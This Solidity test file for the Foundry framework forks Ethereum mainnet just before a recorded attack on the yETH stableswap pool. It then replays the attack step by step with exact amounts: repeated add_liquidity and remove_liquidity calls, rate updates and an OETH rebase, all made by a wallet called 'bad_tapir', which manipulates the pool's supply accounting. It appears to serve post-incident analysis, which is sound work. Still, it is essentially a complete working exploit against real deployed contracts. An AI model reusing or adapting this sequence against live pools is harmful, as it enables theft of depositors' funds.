// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "forge-std/interfaces/IERC20.sol";

import {IPool} from "./interfaces/IPool.sol";
import {IOETH} from "./interfaces/IOETH.sol";

import "forge-std/Test.sol";

contract HackTests is Test {

    bytes32 constant DEBUG_ASSET = keccak256("DebugAddLiquidityAsset(uint256,uint256,uint256)");

    bytes localCode;
    bytes newDeployedCode;

    IPool public localPool;

    IPool public constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 public constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
    IOETH public constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);

    function setUp() public virtual {

        //
        // create fork
        //

        uint256 _blockNumber = 23914085; // Attack was on block `23914086`
        vm.selectFork(vm.createFork(vm.envString("ETH_RPC_URL"), _blockNumber));

        //
        // deploy local version of Pool
        //

        address[] memory _assets = new address[](8);
        _assets[0] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        _assets[1] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // wstETH
        _assets[2] = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b; // ETHx
        _assets[3] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        _assets[4] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        _assets[5] = 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6; // apxETH
        _assets[6] = 0xDcEe70654261AF21C44c093C300eD3Bb97b78192; // WOETH
        _assets[7] = 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa; // mETH

        address[] memory _rateProviders = new address[](8); // same rate provider for all assets
        _rateProviders[0] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[1] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[2] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[3] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[4] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[5] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[6] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;
        _rateProviders[7] = 0x5a7CbC89d543399743D7c4b4a21110b19c6208AE;

        uint256[] memory _weights = new uint256[](8);
        _weights[0] = 200000000000000000; // 20%
        _weights[1] = 200000000000000000; // 20%
        _weights[2] = 100000000000000000; // 10%
        _weights[3] = 100000000000000000; // 10%
        _weights[4] = 100000000000000000; // 10%
        _weights[5] = 250000000000000000; // 25%
        _weights[6] = 25000000000000000; // 2.5%
        _weights[7] = 25000000000000000; // 2.5%

        localPool = IPool(deployCode("Pool", abi.encode(
            address(YETH), // token
            450000000000000000000, // amplification
            _assets,
            _rateProviders,
            _weights
        )));

        //
        // replace deployed Pool code with local Pool code
        //

        localCode = address(localPool).code;
        vm.etch(address(POOL), localCode);
        newDeployedCode = address(POOL).code;
        assertEq(localCode, newDeployedCode);
    }

    function test_attack() public {
        address bad_tapir = address(69);
        vm.startPrank(bad_tapir);

        for (uint256 i = 0; i < 8; i++) {
            address asset = POOL.assets(i);
            deal(asset, bad_tapir, 20_000e18);
            IERC20(asset).approve(address(POOL), type(uint256).max);
         }

        uint256[] memory rates = new uint256[](8);
        rates[0] = 0;
        rates[1] = 1;
        rates[2] = 2;
        rates[3] = 3;
        rates[4] = 4;
        rates[5] = 5;
        rates[6] = 0;
        rates[7] = 0;
        console.log("Supply before first update_rates (YETH.totalSupply())", YETH.totalSupply());
        POOL.update_rates(rates);
        console.log("Supply after first update_rates (YETH.totalSupply())", YETH.totalSupply());

        uint256 balance;
        (uint256 prod, uint256 sum) = POOL.vb_prod_sum();
        console.log("prod", prod);
        console.log("sum", sum);
        // for (uint256 i = 0; i < 8; i++) {
        //     balance = POOL.virtual_balance(i);
        //     console.log("balance index", i, balance);
        //  }
        
        uint256 firstRemoveYeth = 416373487230773958294;
        deal(address(YETH), bad_tapir, firstRemoveYeth);
        YETH.approve(address(POOL), type(uint256).max);
        console.log("Balance of yETH bad_tapir", YETH.balanceOf(bad_tapir));
        POOL.remove_liquidity(firstRemoveYeth, new uint256[](8), bad_tapir);
        
        // for (uint256 i = 0; i < 8; i++) {
        //     balance = POOL.virtual_balance(i);
        //     console.log("balance index", i, balance);
        //  }
         (prod, sum) = POOL.vb_prod_sum();
         console.log("pro after first", prod);
         console.log("sum after first", sum);
        
        // Add liquidity
        uint256[] memory addAmounts = new uint256[](8);
        addAmounts[0] = 610669608721347951666;
        addAmounts[1] = 777507145787198969404;
        addAmounts[2] = 563973440562370010057;
        addAmounts[3] = 0;
        addAmounts[4] = 476460390272167461711;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        uint256 receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after add_liquidity", prod);
        console.log("vb_sum after add_liquidity", sum);
        
        // First Remove liquidity
        POOL.remove_liquidity(2789348310901989968648, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after remove_liquidity", prod);
        console.log("vb_sum after remove_liquidity", sum);
        
        // Second add_liquidity
        addAmounts[0] = 1636245238220874001286;
        addAmounts[1] = 1531136279659070868194;
        addAmounts[2] = 1041815511903532551187;
        addAmounts[3] = 0;
        addAmounts[4] = 991050908418104947336;
        addAmounts[5] = 1346008005663580090716;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after second add_liquidity", prod);
        console.log("vb_sum after second add_liquidity", sum);
        
        // Second remove_liquidity
        POOL.remove_liquidity(7379203011929903830039, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after second remove_liquidity", prod);
        console.log("vb_sum after second remove_liquidity", sum);
        
        // Third add_liquidity
        addAmounts[0] = 1630811661792970363090;
        addAmounts[1] = 1526051744772289698092;
        addAmounts[2] = 1038108768586660585581;
        addAmounts[3] = 0;
        addAmounts[4] = 969651157511131341121;
        addAmounts[5] = 1363135138655820584263;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after third add_liquidity", prod);
        console.log("vb_sum after third add_liquidity", sum);
        
        // Third remove_liquidity
        POOL.remove_liquidity(7066638371690257003757, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after third remove_liquidity", prod);
        console.log("vb_sum after third remove_liquidity", sum);
        
        // Fourth add_liquidity
        addAmounts[0] = 859805263416698094503;
        addAmounts[1] = 804573178584505833740;
        addAmounts[2] = 546933182262586953508;
        addAmounts[3] = 0;
        addAmounts[4] = 510865922059584325991;
        addAmounts[5] = 723182384178548055243;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after fourth add_liquidity", prod);
        console.log("vb_sum after fourth add_liquidity", sum);
        
        // Fourth remove_liquidity
        POOL.remove_liquidity(3496158478994807127953, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after fourth remove_liquidity", prod);
        console.log("vb_sum after fourth remove_liquidity", sum);
        
        // Fifth add_liquidity
        addAmounts[0] = 1784169320136805803209;
        addAmounts[1] = 1669558029141448703194;
        addAmounts[2] = 1135991585797559066395;
        addAmounts[3] = 0;
        addAmounts[4] = 1061079136814511050837;
        addAmounts[5] = 1488254960317842892500;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        vm.recordLogs();
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);

        // Debug: capture vb_prod_final / vb_sum_final before _calc_supply in this add
        console.log("debug vb_prod_before_calc", POOL.debug_vb_prod_before_calc());
        console.log("debug vb_sum_before_calc", POOL.debug_vb_sum_before_calc());

        Vm.Log[] memory logsAsset = vm.getRecordedLogs();
        for (uint256 i = 0; i < logsAsset.length; i++) {
            Vm.Log memory lg = logsAsset[i];
            if (lg.topics.length > 0 && lg.topics[0] == DEBUG_ASSET) {
                uint256 assetIdx = uint256(lg.topics[1]);
                (uint256 powUp, uint256 prodAfter) = abi.decode(lg.data, (uint256, uint256));
                console.log("fifth add asset", assetIdx, powUp, prodAfter);
            }
        }
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after fifth add_liquidity", prod);
        console.log("vb_sum after fifth add_liquidity", sum);
        
        // Sixth add_liquidity
        addAmounts[0] = 0;
        addAmounts[1] = 0;
        addAmounts[2] = 0;
        addAmounts[3] = 20605468750000000000;
        addAmounts[4] = 0;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        console.log("Supply before sixth add_liquidity", POOL.supply());
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after sixth add_liquidity", prod);
        console.log("vb_sum after sixth add_liquidity", sum);
        console.log("Supply after sixth add_liquidity", POOL.supply());
        // Fifth remove_liquidity
        POOL.remove_liquidity(0, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after remove_liquidity(0)", prod);
        console.log("vb_sum after remove_liquidity(0)", sum);
        
        console.log("Supply before update_rates", POOL.supply());
        // Update rates with asset index 6
        uint256[] memory rates2 = new uint256[](1);
        rates2[0] = 6;
        console.log("Supply before second update_rates (YETH.totalSupply())", YETH.totalSupply());
        POOL.update_rates(rates2);
        console.log("Supply after second update_rates (YETH.totalSupply())", YETH.totalSupply());
        console.log("Supply after second update_rates (POOL.supply())", POOL.supply());

        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after update_rates", prod);
        console.log("vb_sum after update_rates", sum);
        
        // Sixth remove_liquidity
        POOL.remove_liquidity(8434932236461542896540, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after remove_liquidity", prod);
        console.log("vb_sum after remove_liquidity", sum);

        OETH.rebase();

        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after rebase", prod);
        console.log("vb_sum after rebase", sum);
        
        // Seventh add_liquidity
        addAmounts[0] = 1049508928999413985639;
        addAmounts[1] = 982090679001395746930;
        addAmounts[2] = 667668088369153429906;
        addAmounts[3] = 0;
        addAmounts[4] = 623639019639346230238;
        addAmounts[5] = 878771594643399886538;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after seventh add_liquidity", prod);
        console.log("vb_sum after seventh add_liquidity", sum);
        
        // Eighth add_liquidity
        addAmounts[0] = 919888612738016815095;
        addAmounts[1] = 860796899699397749576;
        addAmounts[2] = 586033288771470394081;
        addAmounts[3] = 0;
        addAmounts[4] = 547387589810030997702;
        addAmounts[5] = 763397793689173373329;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after eighth add_liquidity", prod);
        console.log("vb_sum after eighth add_liquidity", sum);
        
        // Ninth add_liquidity
        addAmounts[0] = 0;
        addAmounts[1] = 0;
        addAmounts[2] = 0;
        addAmounts[3] = 57226562500000000000;
        addAmounts[4] = 0;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after ninth add_liquidity", prod);
        console.log("vb_sum after ninth add_liquidity", sum);
        
        // Seventh remove_liquidity
        POOL.remove_liquidity(0, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after remove_liquidity(0)", prod);
        console.log("vb_sum after remove_liquidity(0)", sum);
        
        // Update rates with asset index 6
        rates2[0] = 6;
        console.log("Supply before third update_rates (YETH.totalSupply())", YETH.totalSupply());   
        POOL.update_rates(rates2);
        console.log("Supply after third update_rates (YETH.totalSupply())", YETH.totalSupply());
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after update_rates", prod);
        console.log("vb_sum after update_rates", sum);
        
        // Eighth remove_liquidity
        POOL.remove_liquidity(9237030802829017297880, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after eighth remove_liquidity", prod);
        console.log("vb_sum after eighth remove_liquidity", sum);
        
        // Tenth add_liquidity
        addAmounts[0] = 417517891458429416749;
        addAmounts[1] = 390697418752374378114;
        addAmounts[2] = 264940493241640253533;
        addAmounts[3] = 0;
        addAmounts[4] = 247469112791605057921;
        addAmounts[5] = 355235146731093304055;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after tenth add_liquidity", prod);
        console.log("vb_sum after tenth add_liquidity", sum);
        
        // Eleventh add_liquidity
        addAmounts[0] = 1779325564746959656328;
        addAmounts[1] = 1665025426427657662239;
        addAmounts[2] = 1133554647882989836457;
        addAmounts[3] = 0;
        addAmounts[4] = 1058802901663485490031;
        addAmounts[5] = 1476627921656231103547;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after eleventh add_liquidity", prod);
        console.log("vb_sum after eleventh add_liquidity", sum);
        
        // Twelfth add_liquidity
        addAmounts[0] = 0;
        addAmounts[1] = 0;
        addAmounts[2] = 0;
        addAmounts[3] = 318750000000000000000;
        addAmounts[4] = 0;
        addAmounts[5] = 0;
        addAmounts[6] = 0;
        addAmounts[7] = 0;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after twelfth add_liquidity", prod);
        console.log("vb_sum after twelfth add_liquidity", sum);
        
        // Ninth remove_liquidity
        POOL.remove_liquidity(0, new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after remove_liquidity(0)", prod);
        console.log("vb_sum after remove_liquidity(0)", sum);
        
        // Update rates with asset index 7
        rates2[0] = 7;
        console.log("Supply before fourth update_rates (meth) (YETH.totalSupply())", YETH.totalSupply());
        POOL.update_rates(rates2);
        console.log("Supply after fourth update_rates (YETH.totalSupply())", YETH.totalSupply());
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after update_rates", prod);
        console.log("vb_sum after update_rates", sum);
        
        // FINAL REMOVE LIQUIDITY
        uint sofar = YETH.balanceOf(bad_tapir);
        console.log("so far", sofar);
        console.log("yeth pool supply", POOL.supply());
        POOL.remove_liquidity(POOL.supply(), new uint256[](8), bad_tapir);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after FINAL REMOVE_LIQUIDITY", prod);
        console.log("vb_sum after FINAL REMOVE_LIQUIDITY", sum);
        
        // FINAL add_liquidity
        addAmounts[0] = 1;
        addAmounts[1] = 1;
        addAmounts[2] = 1;
        addAmounts[3] = 1;
        addAmounts[4] = 1;
        addAmounts[5] = 1;
        addAmounts[6] = 1;
        addAmounts[7] = 9;
        receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
        console.log("received yETH", receivedyETH);
        
        (prod, sum) = POOL.vb_prod_sum();
        console.log("vb_prod after FINAL ADD_LIQUIDITY", prod);
        console.log("vb_sum after FINAL ADD_LIQUIDITY", sum);
    }
}
